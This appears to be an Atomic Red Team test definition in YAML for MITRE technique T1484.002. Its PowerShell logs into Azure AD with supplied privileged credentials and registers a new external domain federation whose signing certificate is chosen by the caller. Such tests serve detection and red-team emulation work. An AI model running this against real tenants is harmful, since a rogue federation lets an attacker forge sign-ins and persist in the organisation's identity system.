attack_technique: T1484.002
display_name: Domain Trust Modification
atomic_tests:
- name: Add Federation to Azure 
  auto_generated_guid: 8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7
  description: |
    Add a new federation to Azure AD using Powershell. The other Identity Provider must be configured beforehand.
    If ADFS is used as IdP, the Uris parameters can be found at "https://<federationservice>.<domainname>.com/federationmetadata/2007-06/federationmetadata.xml"
  supported_platforms:
  - azure-ad
  input_arguments:
    azure_username:
      description: Username of a privileged azure account
      type: String
      default: bruce.wayne@contosocloud.com
    azure_password:
      description: Password of azure_usernama
      type: String
      default: iamthebatman
    active_logon_uri:
      description: Acctive Logon Uri
      type: String
      default: "https://sts.contoso.com/adfs/ls/"
    issuer_uri:
      description: Issuer Uri
      type: String
      default: "http://sts.contoso.com/adfs/services/trust"
    metadata_uri:
      description: Metadata exchange Uri
      type: String
      default: "https://sts.totheclouddemo.com/adfs/services/trust/mex"
    public_key:
      description: Public key of the X509 signing token certificate
      type: String
      default: "12345678912345678"
    domain_name:
      description: New federation domain name
      type: String
      default: "contoso.com"
  dependency_executor_name: powershell
  dependencies:
  - description: |
      AzureADPreview Powershell module must be installed. The Identity Provider to be federated must be configured.
    prereq_command: |
      if (Get-Module AzureADPreview) {exit 0} else {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureADPreview -Force
  executor:
    command: |
      Import-Module AzureADPreview
      $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
      Connect-AzureAD -Credential $Credential > $null

      $federationSettings = New-Object Microsoft.Open.AzureAD.Model.DomainFederationSettings
      $federationSettings.ActiveLogOnUri = "#{active_logon_uri}"
      $federationSettings.IssuerUri = "#{issuer_uri}"
      $federationSettings.LogOffUri = $federationSettings.ActiveLogOnUri
      $federationSettings.MetadataExchangeUri = "#{metadata_uri}"
      $federationSettings.PassiveLogOnUri = $federationSettings.ActiveLogOnUri
      $federationSettings.PreferredAuthenticationProtocol = "WsFed"
      $federationSettings.SigningCertificate = "#{public_key}"
      $new = New-AzureADExternalDomainFederation -ExternalDomainName "#{domain_name}" -FederationSettings $federationSettings
      if ($new) { Write-Host "`nFederation successfully added to Azure AD" } else { Write-Host "`nThe federation setup failed" }
    
    name: powershell
    
